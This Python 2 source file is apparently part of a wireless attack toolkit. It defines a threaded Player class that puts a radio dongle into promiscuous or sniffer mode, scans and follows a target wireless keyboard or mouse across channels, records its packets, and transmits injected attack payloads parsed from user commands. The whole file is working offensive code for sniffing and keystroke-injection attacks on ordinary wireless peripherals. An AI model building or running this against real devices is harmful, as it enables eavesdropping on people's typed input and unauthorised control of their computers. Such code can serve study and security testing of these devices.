#!/usr/bin/env python2
'''
Author: xswxm
Blog: xswxm.com

This script includes a class, which is responsible for scanning, sniffing, and attacking devices.
It is a key component of the whole scripts.
'''

import sys
sys.path.append("..")

import time, threading
from lib import common
from utils.messager import Messager
from utils import config
# from utils.devices import amazonbasics, logitech_mouse

from array import array
class Player(threading.Thread):
  _flag = threading.Event()
  _pause = True
  mode = 0
  payloads = []
  records = []
  channel_index = 0
  channel = common.channels[0]
  feature_ping = None
  last_ping = time.time()
  total_ping = 0
  
  # Constructor
  def __init__(self, mode=0, prefix=array('B', [])):
    threading.Thread.__init__(self)
    self._stopevent = threading.Event()
    Player.mode = mode
    self.prefix = prefix

  # Setup device
  # def setup(self, mode=Player.mode, prefix=Player.prefix):
  def setup(self, mode=0, prefix=array('B', [])):
    # Paues current task
    self.pause()
    # Reset values
    Player.mode = mode
    self.prefix = prefix
    Player.payloads = []
    Player.records = []
    # Parse the prefix addresses
    prefix_address = ''.join('{:02X}'.format(b) for b in self.prefix).decode('hex')[::-1][:5]
    # Put the radio in sniffer mode (ESB w/o auto ACKs)
    if Player.mode == 0:
      common.radio.enter_promiscuous_mode(prefix_address)
      # common.radio.enter_promiscuous_mode_generic(prefix_address, 2)
    else:
      common.radio.enter_sniffer_mode(prefix_address)
      Player.channel = config.devices[config.deviceID].channels[-1]
      common.radio.set_channel(Player.channel)
    Player.total_ping = 0
    Messager.total_pings = [0]*10
    Player._flag.set()
    Messager._flag.set()

  # Ping address in diff channels
  def ping(self):
    success = True
    # Follow the target device if it changes channels
    if time.time() - Player.last_ping > common.timeout:
      # First try pinging on the active channel
      if not common.radio.transmit_payload(common.ping_payload, common.ack_timeout, common.retries):
        # Ping failed on the active channel, so sweep through all available channels
        success = False
        channels = common.channels[:]
        for channel in config.devices[config.deviceID].channels:
          channels.remove(channel)
          common.radio.set_channel(channel)
          if common.radio.transmit_payload(common.ping_payload, common.ack_timeout, common.retries):
            # Ping successful, exit out of the ping sweep
            Player.last_ping = time.time()
            success = True
            Player.channel = channel
            break
        else:
          for channel in channels:
            common.radio.set_channel(channel)
            if common.radio.transmit_payload(common.ping_payload, common.ack_timeout, common.retries):
              # Add new channel to channels
              config.devices[config.deviceID].channels.append(channel)
              config.devices[config.deviceID].channels.sort()
              # Ping successful, exit out of the ping sweep
              Player.last_ping = time.time()
              success = True
              Player.channel = channel
              break
      # Ping succeeded on the active channel
      else:
        Player.last_ping = time.time()
    return success

# Ping address with given channel, retries
  def ping_channel(self, channel, retries=8):
    success = False
    common.radio.set_channel(channel)
    if common.radio.transmit_payload(common.ping_payload, common.ack_timeout, retries):
      # Add new channel to channels
      if not channel in config.devices[config.deviceID].channels:
        config.devices[config.deviceID].channels.append(channel)
        config.devices[config.deviceID].channels.sort()
      # Ping successful, exit out of the ping sweep
      Player.last_ping = time.time()
      success = True
      Player.channel = channel
    else:
      # Reverse channel settings
      common.radio.set_channel(Player.channel)
    return success


  # Scan devices
  def scan(self):
    # Increment the channel
    if len(common.channels) > 1 and time.time() - Player.last_ping > common.timeout and time.time() > Player.feature_ping:
      Player.channel_index = (Player.channel_index + 1) % (len(common.channels))
      Player.channel = common.channels[Player.channel_index]
      common.radio.set_channel(Player.channel)
      Player.last_ping = time.time()
    # Received payload
    value = common.radio.receive_payload()
    if len(value) >= 5:
      # Split the address and payload and append them into the records
      self.add_record([value[0:5], Player.channel, value[5:]])

  # Sniff packets
  def sniff(self):
    # Receive payloads
    if self.ping():
      value = common.radio.receive_payload()
      if value[0] == 0:
        # Reset the channel timer
        Player.last_ping = time.time()
        # Split the payload from the status byte and store the record
        self.add_record([Player.channel, value[1:]])

  # Launch attacks or send payloads
  def attack(self):
    # Send payload if ping was successful
    if self.ping():
      while Player.payloads != []:
        # Get a new payload
        payload = Player.payloads[0]
        del Player.payloads[0]
        # Get system payloads, such as pause this thread for few seconds
        if len(payload) == 1:
          channel = payload[0]
          if self.ping_channel(channel):
            self.add_record(['SYS', 'Set channel {0} succeeded!'.format(channel)])
          else:
            self.add_record(['SYS', 'Set channel {0} failed!'.format(channel)])
          break
        elif len(payload) == 2:
          t = payload[0]+payload[1]*0x100
          self.add_record(['SYS', 'Sleep for {0} milliseconds'.format(t)])
          time.sleep(float(t)/1000)
          break
        # Get a new payload
        p = None
        p = ':'.join('{:02X}'.format(b) for b in payload)
        self.add_record([Player.channel, p])
        # Send the payload
        p = p.replace(':', '').decode('hex')
        common.radio.transmit_payload(p)
        if not Player._flag.isSet(): break
        time.sleep(0.025)
    # Stop if it has no payloads to to play
    # if Player.payloads == []: Player._flag.clear()

  # Launch attacks or send payloads
  def compute_ping_rate(self, timeout=0, retries=0):
    # Send payload if ping was successful
    if common.radio.transmit_payload(common.ping_payload, timeout, retries):
      Player.total_ping += 1
    Messager._flag.set()

  # Assign new commands and attack
  def assign(self, cmds):
    try:
      # Parse commands into payload list
      Player.payloads = config.parse_attack_commands(cmds)
      # Weak up thread to launch attack
      Messager._flag.set()
      Player._flag.set()
    except Exception as e:
      self.add_record(['Err', str(e)])

  # Add new record and refresh display
  def add_record(self, record):
    Player.records.append(record)
    Messager._flag.set()

  # Main thread
  def run(self):
    self.setup()
    while not self._stopevent.isSet():
      # Running code here
      if Player.mode == 0:
        self.scan()
      elif Player.mode == 1:
        self.sniff()
      elif Player.payloads != []:
        self.attack()
      else:
        self.compute_ping_rate()
      Player._pause = True
      Player._flag.wait()
      Player._pause = False

  # Exit thread
  def join(self, timeout=None):
    while self.isAlive():
      Player._flag.set()
      self._stopevent.set()
      threading.Thread.join(self, timeout)

  # Stop thread
  def pause(self):
    while not Player._pause:
      Player._flag.clear()
      time.sleep(0.05)
